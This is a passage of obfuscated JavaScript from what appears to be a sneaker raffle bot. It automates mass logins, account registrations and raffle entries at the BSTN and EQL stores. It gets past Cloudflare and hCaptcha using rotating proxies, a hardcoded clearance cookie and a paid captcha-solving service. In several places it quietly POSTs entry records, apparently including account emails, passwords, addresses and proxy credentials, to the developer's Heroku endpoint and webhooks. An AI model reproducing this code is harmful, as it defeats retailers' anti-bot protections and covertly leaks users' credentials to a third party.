                        _0x59687e(_0xaad8c0['name'] + '\x20Task\x20' + (_0xe1a6a + 0x1) + '\x20/\x20' + _0x33b865['length'] + '\x20||\x20File:\x20' + _0x2b0c3a + '\x20Proxies:\x20' + _0x5e9a1f);
                        var _0x1ac5c6 = Math['round'](Math['random']() * (_0x5c2069['length'] - 0x1)), _0x3176d5 = _0x5c2069[_0x1ac5c6]['split'](':'), _0xa0e4cf;
                        try {
                            _0xa0e4cf = await _0x5dd90e['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': ![],
                                'args': [
                                    '--proxy-server=' + _0x3176d5[0x0] + ':' + _0x3176d5[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        } catch {
                            _0xa0e4cf = await _0x5dd90e['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': ![],
                                'args': [
                                    '--proxy-server=' + _0x3176d5[0x0] + ':' + _0x3176d5[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        }
                        try {
                            const _0x3e9755 = await _0xa0e4cf['newPage'](), _0x4fb417 = await _0x3e9755['target']()['createCDPSession'](), { windowId: _0x127450 } = await _0x4fb417['send']('Browser.getWindowForTarget');
                            await _0x3e9755['setViewport']({
                                'width': 0x501,
                                'height': 0x2d0
                            });
                            var _0x2f2778 = [{
                                'name': 'cf_clearance',
                                'value': 'uyuh7Wo9shR3zcpWvbWJ04mG0iNC2N25mhp1FNAbHYY-1676282182-0-1-9764d0ee.e7bea100.c0658f0e-160',
                                'domain': '.bstn.com',
                                'path': '/',
                                'expires': 1707818183.331533,
                                'httpOnly': !![],
                                'secure': !![]
                            }];
                            await _0x3e9755['authenticate']({
                                'username': '' + _0x3176d5[0x2],
                                'password': '' + _0x3176d5[0x3]
                            }), console['log'](_0xed09ee() + '\x20[' + _0xaad8c0['name'] + ']\x20Task\x20' + (_0xe1a6a + 0x1) + '\x20:\x20Getting\x20Session'), await _0x3e9755['goto']('' + _0x33b865[_0xe1a6a]['Url'], { 'waitUntil': 'networkidle2' }), console['log'](_0xed09ee() + '\x20[' + _0xaad8c0['name'] + ']\x20Task\x20' + (_0xe1a6a + 0x1) + '\x20:\x20Solving\x20Cloudflare');
                            var _0x429041 = await _0x3e9755['$']('.hcaptcha-box');
                            if (_0x429041) {
                                console['log'](_0xed09ee() + '\x20[' + _0xaad8c0['name'] + ']\x20Task\x20' + (_0xe1a6a + 0x1) + '\x20:\x20Handling\x20Challenge'), await _0x572e60(0x2710);
                                const _0x4860c9 = await _0x3e9755['$']('.hcaptcha-box');
                                if (_0x4860c9)
                                    try {
                                        await _0x4860c9['click']();
                                    } catch {
                                        throw new Error('Empty\x20Turnstile\x20Challenge');
                                    }
                                try {
                                    await _0x3e9755['waitForSelector']('input[name=\x22firstname\x22]', { 'timeout': 0x9c40 });
                                } catch {
                                    var _0x2c6892 = await _0x3e9755['$']('.hcaptcha-box');
                                    if (_0x2c6892)
                                        try {
                                            await _0x2c6892['click']();
                                        } catch {
                                            throw new Error('Empty\x20Turnstile\x20Challenge');
                                        }
                                }
                            }
                            try {
                                await _0x3e9755['waitForSelector']('.nonLoggedSpecific_nonLogged__SCu0L');
                            } catch {
                                throw new Error('Blocked\x20by\x20Cloudflare');
                            }
                            await _0x4fb417['send']('Browser.setWindowBounds', {
                                'windowId': _0x127450,
                                'bounds': { 'windowState': 'minimized' }
                            }), await _0x572e60(0x1388), await _0x3e9755['waitForSelector']('.nonLoggedSpecific_nonLogged__SCu0L\x20>\x20.Button_secondary__XJln1.Button_button__Bq8yb'), await _0x3e9755['focus']('.nonLoggedSpecific_nonLogged__SCu0L\x20>\x20.Button_secondary__XJln1.Button_button__Bq8yb'), await _0x572e60(0x1f4), console['log'](_0xed09ee() + '\x20[' + _0xaad8c0['name'] + ']\x20Task\x20' + (_0xe1a6a + 0x1) + '\x20:\x20Logging\x20in'), await _0x3e9755['$eval']('.nonLoggedSpecific_nonLogged__SCu0L\x20>\x20.Button_secondary__XJln1.Button_button__Bq8yb', _0x1f9869 => _0x1f9869['click']()), await _0x3e9755['click']('.nonLoggedSpecific_nonLogged__SCu0L\x20>\x20.Button_secondary__XJln1.Button_button__Bq8yb'), await _0x3e9755['click']('.nonLoggedSpecific_nonLogged__SCu0L\x20>\x20.Button_secondary__XJln1.Button_button__Bq8yb'), await _0x572e60(0x7d0), await _0x3e9755['waitForSelector']('#email-login'), await _0x3e9755['type']('#email-login', '' + _0x33b865[_0xe1a6a]['Email']), await _0x572e60(0xdac), await _0x3e9755['waitForSelector']('#password'), await _0x3e9755['type']('#password', '' + _0x33b865[_0xe1a6a]['Password'], { 'delay': 0xe6 }), await _0x572e60(0x157c);
                            try {
                                await _0x3e9755['$eval']('.login_accountInfo__FCIxY\x20>\x20button[type=\x22submit\x22]', _0x217fda => _0x217fda['click']());
                            } catch {
                            }
                            try {
                                await _0x3e9755['waitForSelector']('.swatchOptions_sizeTiles__Lizc2');
                            } catch (_0x181de3) {
                            }
                            await _0x572e60(0x3e8);
                            const _0x316506 = await _0x3e9755['$']('.enteredDraw_container__2KmQ_');
                            if (_0x316506)
                                throw new Error('Duplicate\x20Entry');
                            console['log'](_0xed09ee() + '\x20[' + _0xaad8c0['name'] + ']\x20Task\x20' + (_0xe1a6a + 0x1) + '\x20:\x20Choosing\x20Size\x20' + _0x33b865[_0xe1a6a]['Size']);
                            try {
                                if (_0x33b865[_0xe1a6a]['Size'] != 'RANDOM') {
                                    var _0x2bf639 = _0x33b865[_0xe1a6a]['Size']['replace']('.', ',');
                                    const _0x310bbb = await _0x3e9755['$x']('//div[contains(text(),\x20\x27' + _0x2bf639 + '\x27)]');
                                    await _0x310bbb[0x0]['click']();
                                } else {
                                    const _0x39f06f = await _0x3e9755['$$']('div.swatchTile_tile__IRH9Q');
                                    var _0x361f91 = Math['round'](Math['random']() * (_0x39f06f['length'] - 0x1));
                                    await _0x39f06f[_0x361f91]['click']();
                                }
                            } catch (_0x28dd38) {
                                throw new Error('Softblocked,\x20Rotating\x20proxy');
                            }
                            await _0x572e60(0x1f4);
                            const _0x98fb68 = await _0x3e9755['$']('.addressList_addressItem__LE2PB');
                            if (_0x98fb68 && _0x33b865[_0xe1a6a]['Mode'] != 'NEW') {
                            } else
                                console['log'](_0xed09ee() + '\x20[' + _0xaad8c0['name'] + ']\x20Task\x20' + (_0xe1a6a + 0x1) + '\x20:\x20Filling\x20Address'), await _0x3e9755['click']('div.product_shipping__zEfqd\x20>\x20div\x20>\x20div.legend_legend__sQIiF\x20>\x20div.legend_header__iHZIh\x20>\x20div\x20>\x20button'), await _0x572e60(0x5dc), await _0x3e9755['waitForSelector']('#firstname'), await _0x3e9755['type']('#firstname', '' + _0x33b865[_0xe1a6a]['FirstName']), await _0x572e60(0x1f4), await _0x3e9755['waitForSelector']('#firstname'), await _0x3e9755['type']('#lastname', '' + _0x33b865[_0xe1a6a]['LastName']), await _0x572e60(0x1f4), await _0x3e9755['waitForSelector']('#firstname'), await _0x3e9755['type']('#street', '' + _0x33b865[_0xe1a6a]['Address1']), await _0x572e60(0x1f4), await _0x3e9755['waitForSelector']('#firstname'), await _0x3e9755['type']('#houseNumber', _0x33b865[_0xe1a6a]['HouseNumber'] + '\x20' + _0x33b865[_0xe1a6a]['Address2']), await _0x572e60(0x1f4), await _0x3e9755['waitForSelector']('#firstname'), await _0x3e9755['select']('#country_code', '' + _0x33b865[_0xe1a6a]['Country']), await _0x572e60(0x1f4), await _0x3e9755['type']('#postcode', '' + _0x33b865[_0xe1a6a]['Zip']), await _0x572e60(0x1f4), await _0x3e9755['type']('#city', '' + _0x33b865[_0xe1a6a]['City']), await _0x572e60(0x1f4), await _0x3e9755['type']('#telephone', '' + _0x33b865[_0xe1a6a]['Phone']), await _0x572e60(0x1f4), await _0x3e9755['click']('.addressModal_submit__dOiL4\x20>\x20button[type=\x22submit\x22]');
                            await _0x572e60(0x9c4);
                            try {
                                await _0x3e9755['type']('#instagram_name', '' + _0x33b865[_0xe1a6a]['Follower']), await _0x3e9755['click']('.note_groupBtn__WLDwH\x20>\x20button');
                            } catch {
                            }
                            console['log'](_0xed09ee() + '\x20[' + _0xaad8c0['name'] + ']\x20Task\x20' + (_0xe1a6a + 0x1) + '\x20:\x20Finishing\x20Entry'), await _0x572e60(0x5dc);
                            try {
                                await _0x3e9755['click']('.checkBox_boxHolder__wLGVe');
                            } catch {
                            }
                            await _0x572e60(0x5dc), await _0x3e9755['$eval']('.termConditions_TC__hll9k\x20>\x20button', _0xf7b9f6 => _0xf7b9f6['click']()), await _0x572e60(0x1388);
                            try {
                                await _0x3e9755['waitForSelector']('.success_msg__2HjJY');
                            } catch {
                                await _0x3e9755['reload']({ 'waitUntil': 'networkidle2' });
                                if (_0x33b865[_0xe1a6a]['Size'] != 'RANDOM') {
                                    var _0x2bf639 = _0x33b865[_0xe1a6a]['Size']['replace']('.', ',');
                                    const _0x5d8076 = await _0x3e9755['$x']('//div[contains(text(),\x20' + _0x2bf639 + ')]');
                                    await _0x5d8076[0x0]['click']();
                                } else {
                                    const _0x43b609 = await _0x3e9755['$$']('div.swatchTile_tile__IRH9Q');
                                    var _0x361f91 = Math['round'](Math['random']() * (_0x43b609['length'] - 0x1));
                                    await _0x43b609[_0x361f91]['click']();
                                }
                                await _0x572e60(0x5dc);
                                try {
                                    await _0x3e9755['hover']('#instagram_name'), await _0x3e9755['type']('#instagram_name', '' + _0x33b865[_0xe1a6a]['Follower']), await _0x3e9755['click']('.note_groupBtn__WLDwH\x20>\x20button');
                                } catch {
                                }
                                console['log'](_0xed09ee() + '\x20[' + _0xaad8c0['name'] + ']\x20Task\x20' + (_0xe1a6a + 0x1) + '\x20:\x20Retrying\x20(' + _0x447b9c + '\x20/\x205)');
                                try {
                                    await _0x3e9755['hover']('.checkBox_boxHolder__wLGVe'), await _0x572e60(0x5dc), await _0x3e9755['click']('.checkBox_boxHolder__wLGVe');
                                } catch {
                                }
                                await _0x572e60(0x157c), await _0x3e9755['$eval']('.termConditions_TC__hll9k\x20>\x20button', _0x32b61b => _0x32b61b['click']()), await _0x572e60(0x1388), await _0x3e9755['waitForSelector']('.success_msg__2HjJY');
                            }
                            _0x1c0296 = 'no', _0x14aa55(_0x33b865[_0xe1a6a], _0xaad8c0);
                            try {
                                prxdata = {
                                    'username': _0x447b4a['replace']('#', ''),
                                    'entrydata': JSON['stringify'](_0xdead65),
                                    'proxy': '' + _0x5c2069[_0xe1a6a]
                                };
                                var _0x204164 = JSON['stringify'](prxdata);
                                let _0x129171 = { 'headers': { 'content-type': 'application/json' } };
                                await _0x3b676e['post']('https://jraffles.herokuapp.com/success', _0x204164, _0x129171);
                            } catch (_0x4a2e55) {
                            }
                            console['log'](_0x2d77f8['green'](_0xed09ee() + '\x20[' + _0xaad8c0['name'] + ']\x20Task\x20' + (_0xe1a6a + 0x1) + '\x20:\x20Raffle\x20Entered!'));
                            var _0x5057ff = await _0x254487(_0x33b865[_0xe1a6a], _0xaad8c0, 'dev', ![]), _0x45a586 = await _0x254487(_0x33b865[_0xe1a6a], _0xaad8c0, 'pub', ![]);
                            const _0x1f7194 = {
                                'succesDEVMSG': { 'embeds': [_0x5057ff] },
                                'succesPUBMSG': { 'embeds': [_0x45a586] }
                            };
                            let _0xdead65 = _0x33b865[_0xe1a6a];
                            try {
                                prxdata = {
                                    'username': _0x447b4a['replace']('#', ''),
                                    'module': _0xaad8c0['name'],
                                    'entrydata': JSON['stringify'](_0xdead65),
                                    'proxy': '' + _0x5c2069[_0xe1a6a]
                                };
                                var _0x204164 = JSON['stringify'](prxdata);
                                let _0x3898c5 = { 'headers': { 'content-type': 'application/json' } };
                                await _0x3b676e['post']('https://jraffles.herokuapp.com/success', _0x204164, _0x3898c5);
                            } catch (_0x4aa1cf) {
                            }
                            try {
                                _0x114346['webhook'] != undefined && _0x114346['webhook'] != '' && await _0x5641c6(_0x114346['webhook'], _0x1f7194['succesDEVMSG']), await _0x572e60(0xc8), await _0x5641c6(_0x1543f5, _0x1f7194['succesDEVMSG']), await _0x572e60(0xc8), await _0x5641c6(_0x30beeb, _0x1f7194['succesPUBMSG']);
                            } catch (_0x431189) {
                                console['log'](_0x2d77f8['yellow'](_0xed09ee() + '\x20[' + _0xaad8c0['name'] + ']\x20Task\x20' + (_0xe1a6a + 0x1) + '\x20:\x20Error\x20sending\x20webhook\x20' + _0x431189));
                            }
                        } catch (_0x451c75) {
                            console['log'](_0x2d77f8['red'](_0xed09ee() + '\x20[' + _0xaad8c0['name'] + ']\x20Task\x20' + (_0xe1a6a + 0x1) + '\x20:\x20' + _0x451c75)), _0x1c0296 = 'yes', _0x1142b8 = '' + _0x451c75;
                            var _0x4b137b = await _0x254487(_0x33b865[_0xe1a6a], _0xaad8c0, 'dev', !![], _0x1142b8), _0x5057ff = await _0x254487(_0x33b865[_0xe1a6a], _0xaad8c0, 'dev', ![]), _0x45a586 = await _0x254487(_0x33b865[_0xe1a6a], _0xaad8c0, 'pub', ![]);
                            const _0x376465 = {
                                'succesDEVMSG': { 'embeds': [_0x5057ff] },
                                'succesPUBMSG': { 'embeds': [_0x45a586] }
                            };
                            _0x376465['errorDEV'] = { 'embeds': [_0x4b137b] }, _0x114346['webhook'] != undefined && _0x114346['webhook'] != '' && await _0x5641c6(_0x114346['webhook'], _0x376465['errorDEV']), await _0x5641c6(_0x188004, _0x376465['errorDEV']);
                        } finally {
                            _0xa0e4cf['close']();
                            if (_0x1c0296 == 'yes' && _0x447b9c != 0x5) {
                                console['log'](_0x2d77f8['red'](_0xed09ee() + '\x20[' + _0xaad8c0['name'] + ']\x20Task\x20' + (_0xe1a6a + 0x1) + '\x20:\x20Retrying\x20(' + _0x447b9c + '\x20/\x205)')), _0xe1a6a = _0xe1a6a - 0x1, _0x447b9c = _0x447b9c + 0x1;
                                continue;
                            }
                            _0x1c0296 == 'yes' && _0x447b9c >= 0x5 && (_0x58f6f1(_0x33b865[_0xe1a6a], _0xaad8c0), _0x1c0296 = 'no', _0x447b9c = 0x0), console['log'](_0xed09ee() + '\x20[' + _0xaad8c0['name'] + ']\x20Waiting\x20for\x20' + _0x114346['delay'] + '\x20ms'), await _0x572e60(_0x114346['delay']);
                        }
                    }
                }
            },
            {
                'name': 'BSTN\x20Win\x20Checker',
                'store': 'BSTN',
                'logo': 'https://www.snkrempire.com/wp-content/uploads/2017/11/E3QHwMSP_400x400.png',
                'function': async function (_0x23762f, _0x5c4955) {
                    _0x5dd90e['use'](_0x118712()), _0x5dd90e['use'](_0x1e1820({
                        'provider': {
                            'id': '2captcha',
                            'token': '' + _0x114346['captchaKey']
                        },
                        'visualFeedback': !![]
                    }));
                    var _0x1f62b0;
                    try {
                        const _0x440eda = _0x3d3f42['readFileSync']('../accounts/bstn.csv', 'utf-8');
                        _0x1f62b0 = _0x365ef0['parse'](_0x440eda, { 'header': !![] })['data'];
                    } catch (_0x3cbbb2) {
                        throw new Error('Error\x20reading\x20accounts/bstn.csv');
                    }
                    for (var _0x42f6b2 = 0x0; _0x42f6b2 < _0x1f62b0['length']; _0x42f6b2++) {
                        if (_0x449e6a != 'yes')
                            var _0x449e6a = '', _0x4099e8 = 0x0;
                        var _0x3cf24b;
                        _0x59687e(_0x23762f['name'] + '\x20Task\x20' + (_0x42f6b2 + 0x1) + '\x20/\x20' + _0x1f62b0['length'] + '\x20||\x20File:\x20' + _0x2b0c3a + '\x20Proxies:\x20' + _0x5e9a1f);
                        var _0x4972a1 = await _0x254487(_0x1f62b0[_0x42f6b2], _0x23762f, 'acc', ![]);
                        const _0x1e2314 = { 'succesDEVMSG': { 'embeds': [_0x4972a1] } }, _0x15bab0 = 'https://www.bstn.com/eu_en/customer/account/create/';
                        var _0x32f546 = Math['round'](Math['random']() * (_0x5c4955['length'] - 0x1)), _0x2bf7e3 = _0x5c4955[_0x32f546]['split'](':'), _0x4eb605;
                        try {
                            _0x4eb605 = await _0x5dd90e['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x2bf7e3[0x0] + ':' + _0x2bf7e3[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        } catch {
                            _0x4eb605 = await _0x5dd90e['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x2bf7e3[0x0] + ':' + _0x2bf7e3[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        }
                        try {
                            const _0x486f64 = await _0x4eb605['newPage']();
                            await _0x486f64['authenticate']({
                                'username': '' + _0x2bf7e3[0x2],
                                'password': '' + _0x2bf7e3[0x3]
                            }), console['log'](_0xed09ee() + '\x20[' + _0x23762f['name'] + ']\x20Task\x20' + (_0x42f6b2 + 0x1) + '\x20:\x20Getting\x20Session'), await _0x486f64['setUserAgent']('Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36'), await _0x486f64['setRequestInterception'](!![]), _0x486f64['on']('request', _0x5dae2a => {
                                _0x5dae2a['resourceType']() === 'image' ? _0x5dae2a['abort']() : _0x5dae2a['continue']();
                            });
                            try {
                                await _0x486f64['goto']('https://www.bstn.com/eu_en/raffle/customer/', { 'waitUntil': 'networkidle2' }), await _0x486f64['waitForSelector']('button[class=\x22cf2Lf6\x22]');
                            } catch {
                                _0x449e6a = 'yes';
                                throw new Error('Connection\x20Error');
                            }
                            await _0x486f64['click']('button[class=\x22cf2Lf6\x22]'), console['log'](_0xed09ee() + '\x20[' + _0x23762f['name'] + ']\x20Task\x20' + (_0x42f6b2 + 0x1) + '\x20:\x20Passing\x20Cloudflare'), await _0x572e60(0x3e8), await _0x486f64['type']('#email', _0x1f62b0[_0x42f6b2]['Email']), await _0x572e60(0x1f4), await _0x486f64['type']('#pass', _0x1f62b0[_0x42f6b2]['Password']), await _0x572e60(0x1f4), await _0x486f64['$eval']('#login-form', _0x1481e3 => _0x1481e3['submit']());
                            try {
                                await _0x486f64['waitForSelector']('.product-items');
                            } catch {
                                console['log'](_0xed09ee() + '\x20[' + _0x23762f['name'] + ']\x20Task\x20' + (_0x42f6b2 + 0x1) + '\x20:\x20No\x20Entries\x20Found');
                                continue;
                            }
                            await _0x572e60(0x190);
                            const _0x4bd783 = await _0x486f64['evaluate'](() => {
                                const _0x141490 = Array['from'](document['querySelectorAll']('.product-item-photo\x20>\x20img'));
                                return _0x141490['map'](_0x38cea4 => _0x38cea4['alt']);
                            }), _0x479606 = await _0x486f64['evaluate'](() => {
                                const _0x4b5cb5 = Array['from'](document['querySelectorAll']('.tooltip.wrapper.product-item-tooltip.first-xs'));
                                return _0x4b5cb5['map'](_0x71f1ff => _0x71f1ff['innerHTML']);
                            }), _0x4439bb = await _0x486f64['$$']('.raffle-winner');
                            if (_0x4439bb['length'] < 0x1) {
                                console['log'](_0xed09ee() + '\x20[' + _0x23762f['name'] + ']\x20Task\x20' + (_0x42f6b2 + 0x1) + '\x20:\x20No\x20Wins\x20Found'), _0x449e6a = 'no';
                                continue;
                            }
                            console['log'](_0xed09ee() + '\x20[' + _0x23762f['name'] + ']\x20Task\x20' + (_0x42f6b2 + 0x1) + '\x20:\x20' + _0x4439bb['length'] + '\x20Wins\x20Found!');
                            for (var _0x6c4c39 = 0x0; _0x6c4c39 < _0x4439bb['length']; _0x6c4c39++) {
                                console['log'](_0x2d77f8['green'](_0x4bd783[_0x6c4c39] + _0x479606[_0x6c4c39]['replace']('\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20', '')));
                            }
                        } catch (_0x351c38) {
                            console['log'](_0x2d77f8['red'](_0xed09ee() + '\x20[' + _0x23762f['name'] + ']\x20Task\x20' + (_0x42f6b2 + 0x1) + '\x20:\x20' + _0x351c38)), _0x3cf24b = '' + _0x351c38;
                            var _0x2ff440 = await _0x254487(_0x1f62b0[_0x42f6b2], _0x23762f, 'acc', !![], _0x3cf24b);
                            _0x1e2314['errorDEV'] = { 'embeds': [_0x2ff440] }, _0x114346['webhook'] != undefined && _0x114346['webhook'] != '' && await _0x5641c6(_0x114346['webhook'], _0x1e2314['errorDEV']), await _0x5641c6(_0x188004, _0x1e2314['errorDEV']), _0x449e6a = 'yes';
                        } finally {
                            if (_0x4eb605)
                                _0x4eb605['close']();
                            if (_0x449e6a == 'yes' && _0x4099e8 != 0x5) {
                                console['log'](_0x2d77f8['red'](_0xed09ee() + '\x20[' + _0x23762f['name'] + ']\x20Task\x20' + (_0x42f6b2 + 0x1) + '\x20:\x20Retrying\x20(' + _0x4099e8 + '\x20/\x205)')), _0x42f6b2 = _0x42f6b2 - 0x1, _0x4099e8 = _0x4099e8 + 0x1;
                                continue;
                            }
                            _0x449e6a == 'yes' && _0x4099e8 >= 0x5 && (_0x58f6f1(_0x1f62b0[_0x42f6b2], _0x23762f), _0x449e6a = 'no', _0x4099e8 = 0x0), console['log'](_0xed09ee() + '\x20[' + _0x23762f['name'] + ']\x20Waiting\x20for\x20' + _0x114346['delay'] + '\x20ms'), await _0x572e60(_0x114346['delay']);
                        }
                    }
                }
            }
        ]
    },
    {
        'name': 'EQL',
        'modules': [{
            'name': 'EQL\x20Raffle\x20Entries',
            'store': 'EQL',
            'logo': 'https://res.cloudinary.com/crunchbase-production/image/upload/c_lpad,h_170,w_170,f_auto,b_white,q_auto:eco,dpr_1/qfc09zbor8py2zfmsdr2',
            'function': async function (_0x1d5e3b, _0x2c852a, _0x245734) {
                _0x5dd90e['use'](_0x118712()), _0x5dd90e['use'](_0x1e1820({
                    'provider': {
                        'id': '2captcha',
                        'token': '' + _0x114346['captchaKey']
                    },
                    'visualFeedback': !![]
                }));
                for (var _0x35225b = 0x0; _0x35225b < _0x2c852a['length']; _0x35225b++) {
                    var _0x3a6a17;
                    _0x59687e(_0x1d5e3b['name'] + '\x20Task\x20' + (_0x35225b + 0x1) + '\x20/\x20' + _0x2c852a['length'] + '\x20||\x20File:\x20' + _0x2b0c3a + '\x20Proxies:\x20' + _0x5e9a1f);
                    try {
                        await _0x44ca58(_0x2c852a, _0x35225b);
                    } catch {
                        _0x33c2a1 = 'no';
                        throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                    }
                    async function _0x4b3c8f(_0x1f321) {
                        const _0x5a0486 = _0x3d3f42['readFileSync']('../successful-tasks.csv', 'utf8'), _0x4a07df = _0x365ef0['parse'](_0x5a0486, { 'header': !![] })['data'];
                        let _0x145587 = ![];
                        for (var _0x517494 of _0x4a07df) {
                            if (_0x517494['Url'] == _0x1f321['Url'] && _0x517494['Email'] == _0x1f321['Email']) {
                                _0x145587 = !![];
                                break;
                            }
                        }
                        return _0x145587;
                    }
                    if (await _0x4b3c8f(_0x2c852a[_0x35225b]) == !![]) {
                        console['log'](_0xed09ee() + '\x20[' + _0x1d5e3b['name'] + ']\x20Task\x20' + (_0x35225b + 0x1) + '\x20:\x20Task\x20Already\x20Entered,\x20Going\x20to\x20Next\x20Task');
                        continue;
                    }
                    var _0x5b14a0 = ![];
                    const _0x94fb06 = _0x3d3f42['readFileSync']('../accounts/eql.csv', 'utf8');
                    var _0x25f20c = _0x365ef0['parse'](_0x94fb06, { 'header': !![] })['data'];
                    for (var _0x470628 of _0x25f20c) {
                        _0x470628['Email'] == _0x2c852a[_0x35225b]['Email'] && (_0x5b14a0 = !![]);
                    }
                    if (_0x5b14a0 == ![]) {
                        var _0x119c0d;
                        if (_0x2c852a[_0x35225b]['Url']['endsWith']('/')) {
                            _0x119c0d = _0x2c852a[_0x35225b]['Url'] + 'register';
                            if (_0x33c2a1 != 'yes')
                                var _0x33c2a1 = '', _0x2819be = 0x0;
                        } else {
                            _0x119c0d = _0x2c852a[_0x35225b]['Url'] + '/register';
                            if (_0x33c2a1 != 'yes')
                                var _0x33c2a1 = '', _0x2819be = 0x0;
                        }
                        if (_0x2c852a[_0x35225b]['Email'] == '' || _0x2c852a[_0x35225b]['FirstName'] == '' || _0x2c852a[_0x35225b]['LastName'] == '') {
                            console['log'](_0xed09ee() + '\x20[' + _0x1d5e3b['name'] + ']\x20Task\x20' + (_0x35225b + 0x1) + '\x20:\x20Invalid\x20CSV');
                            continue;
                        }
                        _0x2c852a[_0x35225b]['Password'] == '' && (_0x2c852a[_0x35225b]['Password'] = 'JRaffles23!');
                        if (_0x114346['useRandomProxy'] = ![])
                            var _0x3a1dad = _0x245734[_0x35225b]['split'](':');
                        else
                            var _0x9befe7 = Math['round'](Math['random']() * (_0x245734['length'] - 0x1)), _0x3a1dad = _0x245734[_0x9befe7]['split'](':');
                        var _0x334aea;
                        try {
                            _0x334aea = await _0x5dd90e['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x3a1dad[0x0] + ':' + _0x3a1dad[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        } catch {
                            _0x334aea = await _0x5dd90e['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x3a1dad[0x0] + ':' + _0x3a1dad[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        }
                        try {
                            const _0x3c841c = await _0x334aea['newPage']();
                            await _0x3c841c['authenticate']({
                                'username': '' + _0x3a1dad[0x2],
                                'password': '' + _0x3a1dad[0x3]
                            }), console['log'](_0xed09ee() + '\x20[' + _0x1d5e3b['name'] + ']\x20Task\x20' + (_0x35225b + 0x1) + '\x20:\x20Getting\x20Session'), await _0x3c841c['setRequestInterception'](!![]), _0x3c841c['on']('request', _0x46b799 => {
                                _0x46b799['resourceType']() === 'image' || _0x46b799['resourceType']() === 'font' || _0x46b799['resourceType']() === 'media' ? _0x46b799['abort']() : _0x46b799['continue']();
                            });
                            try {
                                await _0x3c841c['goto']('' + _0x119c0d);
                            } catch {
                                throw new Error('Connection\x20Error');
                            }
                            console['log'](_0xed09ee() + '\x20[' + _0x1d5e3b['name'] + ']\x20Task\x20' + (_0x35225b + 0x1) + '\x20:\x20Setting\x20Credentials'), await _0x572e60(0x3e8), await _0x3c841c['waitForSelector']('#email'), await _0x3c841c['click']('div[data-testid=\x22field-productVariantID\x22]'), await _0x572e60(0x3e8);
                            try {
                                _0x2c852a[_0x35225b]['Url']['includes']('en-GB') ? await _0x3c841c['click']('li[data-value=\x22UK\x20' + _0x2c852a[_0x35225b]['Size'] + '\x20/\x20US\x20' + (Number(_0x2c852a[_0x35225b]['Size']) + 0x1) + '\x22]') : await _0x3c841c['click']('li[data-value=\x22EU\x20' + _0x2c852a[_0x35225b]['Size'] + '\x22]');
                            } catch {
                                throw new Error('Error\x20fetching\x20' + _0x2c852a[_0x35225b]['Size']);
                            }
                            await _0x572e60(0x6a4), await _0x3c841c['type']('#email', '' + _0x2c852a[_0x35225b]['Email']), await _0x572e60(0x352), await _0x3c841c['waitForSelector']('#password'), await _0x3c841c['type']('#password', '' + _0x2c852a[_0x35225b]['Password']), await _0x572e60(0x352), await _0x3c841c['type']('#phone', '' + _0x2c852a[_0x35225b]['Phone']), await _0x572e60(0x352);
                            const _0x3fa637 = await _0x3c841c['$']('#title\x20>\x20label');
                            await _0x572e60(0x12c);
                            _0x3fa637 && await _0x3fa637['click']();
                            await _0x3c841c['type']('#firstName', '' + _0x2c852a[_0x35225b]['FirstName']), await _0x572e60(0x352), await _0x3c841c['type']('#lastName', '' + _0x2c852a[_0x35225b]['LastName']), await _0x572e60(0x352);
                            _0x2c852a[_0x35225b]['Url']['includes']('footlocker.de') ? await _0x3c841c['type']('#birthdate', _0x362881(0xa, 0x1c) + '.' + _0x362881(0xa, 0xc) + '.' + _0x362881(0x7c6, 0x7d3)) : await _0x3c841c['type']('#birthdate', _0x362881(0xa, 0x1c) + '-' + _0x362881(0xa, 0xc) + '-' + _0x362881(0x7c6, 0x7d3));
                            await _0x572e60(0x352), await _0x3c841c['click']('.MuiBox-root.css-79elbk\x20>\x20button');
                            try {
                                !_0x2c852a[_0x35225b]['Url']['includes']('en-GB') && await _0x3c841c['waitForSelector']('#stateAutocomplete');
                            } catch {
                                throw new Error('Connection\x20Error\x20fetching\x20shipping');
                            }
                            await _0x572e60(0x1f4), await _0x572e60(0x5dc);
                            if (!_0x119c0d['includes']('footlocker'))
                                try {
                                    await _0x3c841c['click']('#country');
                                    const _0x360670 = await _0x3c841c['$']('li[data-value=\x22' + _0x2c852a[_0x35225b]['Country'] + '\x22]');
                                    await _0x360670['click'](), await _0x360670['click']();
                                } catch {
                                    throw new Error('Country.\x20Please\x20use\x20exact\x20data\x20in\x20csv.\x20(Case\x20sensitive)');
                                }
                            await _0x572e60(0x3e8);
                            if (!_0x2c852a[_0x35225b]['Url']['includes']('en-GB')) {
                                await _0x3c841c['click']('#stateAutocomplete'), await _0x572e60(0x1f4);
                                try {
